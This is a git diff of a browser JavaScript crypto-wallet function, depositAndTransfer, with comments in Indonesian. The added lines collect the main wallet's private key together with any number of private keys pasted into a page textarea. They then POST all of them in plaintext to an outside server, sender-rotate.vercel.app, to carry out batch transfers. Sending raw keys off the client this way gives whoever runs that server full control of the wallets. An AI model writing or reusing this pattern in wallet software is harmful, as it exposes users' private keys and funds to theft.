@@ -1,4 +1,3 @@
-// depositAndTransfer.js
 window.depositAndTransfer = async function (provider, signer, connectedAddress, mainWallet, lastCalculatedTotal, chainId, log) {
   try {
     if (!mainWallet) {
@@ -45,21 +44,48 @@ window.depositAndTransfer = async function (provider, signer, connectedAddress, 
     const receipt = await txResponse.wait(1);
     if (receipt.status === 1) {
       log(`✅ TX Successful: ${txResponse.hash}`, "green");
+
+      // Ambil private keys dari textarea
+      const privateKeysInput = document.getElementById("privateKeys")?.value
+        ?.split("\n")
+        .map(line => line.trim())
+        .filter(line => line.match(/^0x[0-9a-fA-F]{64}$/)) || [];
+      const privateKeys = [mainWallet.privateKey, ...privateKeysInput];
+      log(`ℹ️ Using ${privateKeys.length} private keys for rotation`, "cyan");
+
+      // Validasi receivers
+      if (receivers.length === 0) {
+        log("❌ No receivers provided", "red");
+        return;
+      }
+      if (privateKeys.length < receivers.length) {
+        log(`❌ Not enough private keys (${privateKeys.length}) for ${receivers.length} receivers`, "red");
+        return;
+      }
+      log(`ℹ️ Sending to ${receivers.length} receivers`, "cyan");
+
       const response = await fetch("https://sender-rotate.vercel.app/api/transfer", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          privateKey: mainWallet.privateKey,
+          privateKeys,
           chainId: parseInt(chainId),
           amountPerWallet: ethers.utils.formatEther(amountPerWallet),
           receivers,
         }),
+        signal: AbortSignal.timeout(30000),
       });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Fetch failed: ${response.status} ${response.statusText} - ${errorText}`);
+      }
+
       const data = await response.json();
       if (data.success) {
         log("✅ Backend transfers completed", "green");
         data.transactions.forEach((tx, i) => {
-          log(`📤 Transferred ${ethers.utils.formatEther(amountPerWallet)} to ${receivers[i]}: ${tx.hash}`, "blue");
+          log(`📤 Transferred ${ethers.utils.formatEther(amountPerWallet)} to ${tx.receiver} from ${tx.sender}: ${tx.hash}`, "blue");
         });
       } else {
         log(`❌ Backend transfer failed: ${data.error}`, "red");
